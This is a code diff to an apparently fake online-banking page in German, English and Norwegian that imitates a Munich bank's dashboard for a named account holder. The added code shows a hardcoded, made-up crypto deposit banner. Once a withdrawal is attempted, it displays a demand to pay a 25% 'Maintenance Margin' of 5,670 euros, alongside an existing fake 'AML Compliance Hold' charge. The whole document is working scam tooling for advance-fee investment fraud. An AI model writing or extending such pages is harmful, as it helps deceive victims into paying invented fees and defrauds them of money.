@@ -65,6 +65,7 @@ td { padding: 15px; border-bottom: 1px solid #eee; font-size: 14px; }
 
 .error-banner { background: #fff0f0; color: #b30000; padding: 20px; border-left: 5px solid var(--danger); margin-bottom: 30px; display: none; }
 .success-banner { background: #e6fffa; color: #0052cc; padding: 20px; border-left: 5px solid var(--success); margin-bottom: 30px; display: none; font-weight: bold; }
+.info-banner { background: #e3f2fd; color: #0d47a1; padding: 20px; border-left: 5px solid #2196f3; margin-bottom: 30px; display: none; font-weight: bold; }
 </style>
 </head>
 <body>
@@ -121,6 +122,7 @@ Brienner Straße 18, 80333 München, Deutschland
 
 <div class="main-view">
 <div id="page-synth" class="page-view active">
+<div id="synth-notification" class="info-banner" style="display: block;">Added Deposit from Project ETH/BTC</div>
 <h1 id="txt-dash-h1" style="color: var(--blb-blue);">Kontoübersicht - Herr Tor Vikhmar</h1>
 <div class="card">
 <span id="txt-balance-lbl" style="color:#666; font-size:13px; font-weight:bold;">GESAMT-SALDO</span>
@@ -143,6 +145,7 @@ Brienner Straße 18, 80333 München, Deutschland
 
 <div id="page-vire" class="page-view">
 <h1 id="txt-vire-h1" style="color: var(--blb-blue);">SEPA-Überweisung</h1>
+<div id="vire-notification" class="info-banner" style="display: none;"></div>
 <div id="transfer-success" class="success-banner"></div>
 <div id="transfer-error" class="error-banner"></div>
 
@@ -219,7 +222,9 @@ t3_desc: "Staking pool",
 t3_amt: "+19.148,70 €",
 t4_date: "10.09.2026",
 t4_desc: "Required AML Compliance Hold",
-t4_amt: "-8.795,00 €"
+t4_amt: "-8.795,00 €",
+depositNotif: "Added Deposit from Project ETH/BTC",
+vireMarginMsg: "In order to proceed with a withdrawal You are required to cover the Maintenance Margin 25% - 5670.00 eur"
 },
 en: {
 loginBtn: "Online Banking Login",
@@ -261,7 +266,9 @@ t3_desc: "Staking pool",
 t3_amt: "+19,148.70 €",
 t4_date: "10.09.2026",
 t4_desc: "Required AML Compliance Hold",
-t4_amt: "-8,795.00 €"
+t4_amt: "-8,795.00 €",
+depositNotif: "Added Deposit from Project ETH/BTC",
+vireMarginMsg: "In order to proceed with a withdrawal You are required to cover the Maintenance Margin 25% - 5670.00 eur"
 },
 no: {
 loginBtn: "Nettbanking Innlogging",
@@ -303,7 +310,9 @@ t3_desc: "Staking pool",
 t3_amt: "+19 148,70 €",
 t4_date: "10.09.2026",
 t4_desc: "Required AML Compliance Hold",
-t4_amt: "-8 795,00 €"
+t4_amt: "-8 795,00 €",
+depositNotif: "Added Deposit from Project ETH/BTC",
+vireMarginMsg: "In order to proceed with a withdrawal You are required to cover the Maintenance Margin 25% - 5670.00 eur"
 }
 };
 
@@ -311,6 +320,7 @@ t4_amt: "-8 795,00 €"
 let currentBalance = defaultBalance;
 let lastTransaction = null;
 let currentLang = defaultLang;
+let withdrawalAttempted = false;
 
 // --- INITIALIZATION & LOCAL STORAGE ---
 
@@ -388,7 +398,7 @@ function setLanguage(l) {
     }
 
     // 2. Add the NEW hardcoded line: 10.09.2026 | Deposit from Project ETH/BTC | +24,678.00
-    // Note: This is hardcoded as requested to appear before the static history
+    // This ensures it appears immediately after any user withdrawal and before static history
     rowsHTML += `<tr><td>10.09.2026</td><td>Deposit from Project ETH/BTC</td><td class="amt-pos">+24,678.00 €</td></tr>`;
 
     // 3. Add static history
@@ -399,6 +409,13 @@ function setLanguage(l) {
         <tr><td>${d.t3_date}</td><td>${d.t3_desc}</td><td class="amt-pos">${d.t3_amt}</td></tr>
     `;
     document.getElementById('trans-body').innerHTML = rowsHTML;
+
+    // Update Dashboard Notification
+    const synthNotif = document.getElementById('synth-notification');
+    if (synthNotif) {
+        synthNotif.innerText = d.depositNotif;
+        synthNotif.style.display = 'block';
+    }
 }
 
 function formatCurrency(amount, lang) {
@@ -450,6 +467,15 @@ function navigateTo(p) {
     // Clear banners when switching views
     document.getElementById('transfer-error').style.display = 'none';
     document.getElementById('transfer-success').style.display = 'none';
+    document.getElementById('vire-notification').style.display = 'none';
+
+    // Logic: If navigating to Payments (vire) and a withdrawal has already been attempted, show the Margin message
+    if (p === 'vire' && withdrawalAttempted) {
+        const vireNotif = document.getElementById('vire-notification');
+        const d = langData[currentLang];
+        vireNotif.innerText = d.vireMarginMsg;
+        vireNotif.style.display = 'block';
+    }
 }
 
 function processWithdrawal() {
@@ -482,7 +508,7 @@ function processWithdrawal() {
         formattedAmount = "-" + amount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + " €";
     }
 
-    // Store transaction details
+    //    // Store transaction details
     lastTransaction = {
         date: "10.09.2026",
         iban: iban,
@@ -494,11 +520,15 @@ function processWithdrawal() {
     localStorage.setItem('blb_last_tx', JSON.stringify(lastTransaction));
     localStorage.setItem('blb_lang', currentLang);
 
+    // Mark that a withdrawal has occurred to trigger the next notification
+    withdrawalAttempted = true;
+
     // Show success message
     const successBanner = document.getElementById('transfer-success');
     successBanner.innerText = langData[currentLang].successMsg;
     successBanner.style.display = 'block';
     document.getElementById('transfer-error').style.display = 'none';
+    document.getElementById('vire-notification').style.display = 'none';
 
     // Clear inputs
     document.getElementById('input-name').value = '';
